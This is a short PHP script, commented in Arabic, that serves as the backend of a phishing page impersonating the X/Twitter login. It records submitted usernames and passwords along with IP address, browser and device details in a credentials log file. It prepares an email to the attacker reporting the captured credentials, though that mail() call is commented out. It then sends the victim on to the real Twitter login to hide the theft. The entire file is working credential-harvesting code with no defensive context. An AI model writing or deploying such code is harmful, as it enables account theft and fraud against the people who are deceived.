<?php
// تعطيل عرض الأخطاء في الإنتاج
error_reporting(0);

// تسجيل البيانات المسروقة
if ($_POST) {
    $log_data = [
        'timestamp' => $_POST['timestamp'] ?? date('Y-m-d H:i:s'),
        'username' => $_POST['username'] ?? 'N/A',
        'password' => $_POST['password'] ?? 'N/A',
        'ip_address' => $_POST['ip_address'] ?? $_SERVER['REMOTE_ADDR'],
        'user_agent' => $_POST['user_agent'] ?? $_SERVER['HTTP_USER_AGENT'],
        'language' => $_POST['language'] ?? 'N/A',
        'platform' => $_POST['platform'] ?? 'N/A',
        'screen_resolution' => $_POST['screen_resolution'] ?? 'N/A',
        'timezone' => $_POST['timezone'] ?? 'N/A'
    ];
    
    // حفظ في ملف النصوص
    $log_entry = json_encode($log_data, JSON_UNESCAPED_UNICODE) . PHP_EOL;
    file_put_contents('logs/credentials.txt', $log_entry, FILE_APPEND | LOCK_EX);
    
    // إرسال إلى بريد إلكتروني (اختياري)
    $to = "your-email@provider.com";
    $subject = "X Credentials Captured";
    $message = "New credentials captured:\n\n" . print_r($log_data, true);
    $headers = "From: phishing-system@domain.com";
    
    // mail($to, $subject, $message, $headers);
    
    // إعادة التوجيه إلى Twitter الحقيقي
    header('Location: https://twitter.com/login?redirect_after_login');
    exit();
} else {
    // إذا لم تكن هناك بيانات POST، إعادة إلى الصفحة الرئيسية
    header('Location: index.html');
    exit();
}
?>